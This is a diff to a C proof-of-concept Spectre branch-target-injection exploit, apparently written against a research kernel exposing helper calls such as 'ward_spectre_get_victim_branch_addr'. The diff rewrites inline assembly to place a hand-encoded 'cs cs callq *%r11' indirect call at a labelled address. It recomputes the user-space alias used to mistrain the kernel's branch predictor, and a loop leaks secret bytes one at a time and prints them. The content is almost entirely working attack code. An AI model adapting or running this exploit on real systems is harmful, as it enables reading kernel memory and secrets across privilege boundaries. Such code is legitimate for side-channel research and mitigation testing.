@@ -73,16 +73,17 @@ int
 dummy_victim(volatile u8 *channel, volatile u64 dest, volatile int input)
 {
   int result;
-  __asm volatile("dummy_victim_start:\n"
+  __asm volatile("   mov %1, %%r11\n"
                  "   mov $0, %%rdx\n"
                  "1: cmp $0x64, %%rdx\n"
                  "   jle 2f\n"
                  "   jmp 4f\n"
                  "2: jmp 3f\n"
                  "3: add $0x1, %%rdx\n"
-                 "4: call *%1\n"
+                 "dummy_victim_branch_addr:\n"
+                 "4: .byte 0x2e, 0x2e, 0x41, 0xff, 0xd3\n" // "cs cs callq *%r11"
                  "   movl %%eax, %0\n"
-                 : "=r" (result) : "r" (dest): "rdx");
+                 : "=r" (result) : "r" (dest): "rdx", "r11");
   return result;
   // // set up bhb by performing >29 taken branches
   // int result;
@@ -201,13 +202,12 @@ readByte(char *addrToRead, char result[2])
 int
 main(int argc, char *argv[])
 {
-  extern char dummy_victim_start[];
+  extern char dummy_victim_branch_addr[];
 
-  u64 kva = ward_spectre_get_victim_addr(); // need to mistrain this call
+  u64 kva = ward_spectre_get_victim_branch_addr(); // need to mistrain this call
   u64 kga = ward_spectre_get_gadget_addr(); // to predict here
-  int kvoffset = ward_spectre_get_victim_call_offset(); // offset to call instruction
-  int uvoffset = (u8*)dummy_victim_start - (u8*)&dummy_victim;
-  u64 uva = (kva & USER_MASK) + kvoffset - uvoffset;
+  int uvoffset = (u8*)dummy_victim_branch_addr - (u8*)&dummy_victim;
+  u64 uva = (kva & USER_MASK) - uvoffset;
 
   uv = ((int (*)(u8*, u64, int)) uva);
   uga = kga & USER_MASK;
@@ -246,8 +246,6 @@ main(int argc, char *argv[])
   while (index < secret_len) {
     junk += readByte(((char*) secret_addr) + index, result);
     if (result[1] == 1) {
-      // if (result[0] == 0)
-      //   break;
       printf("%c", result[0]);
     } else {
       printf("?");
